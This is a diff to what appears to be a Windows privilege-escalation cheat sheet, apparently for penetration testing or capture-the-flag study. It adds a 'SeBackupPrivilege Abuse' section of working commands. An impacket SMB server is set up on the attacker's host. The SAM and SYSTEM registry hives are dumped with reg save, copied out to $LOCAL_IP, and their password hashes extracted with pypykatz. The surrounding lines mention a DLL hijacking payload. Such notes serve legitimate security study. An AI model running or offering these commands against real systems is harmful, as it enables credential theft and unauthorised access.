@@ -98,6 +98,24 @@ python3 -m http.server 80
 Other privileges that can be exploited if enabled: 
 `SeBackupPrivilege` `SeAssignPrimaryToken` `SeLoadDriver` `SeDebug`
 
+SeBackupPrivilege Abuse:
+#SEDebugPrivilige 
+
+```bash
+impacket-smbserver -smb2support s .
+```
+
+```powershell
+cd c:\
+reg save hklm\sam c:\temp\sam
+reg save hklm\system c:\temp\system
+cp system //$LOCAL_IP/s/system
+cp sam //$LOCAL_IP/s/sam
+```
+
+```bash
+pypykatz registry --sam sam system
+```
 Generate Payload for DLL hijacking
 ---
 ```bash
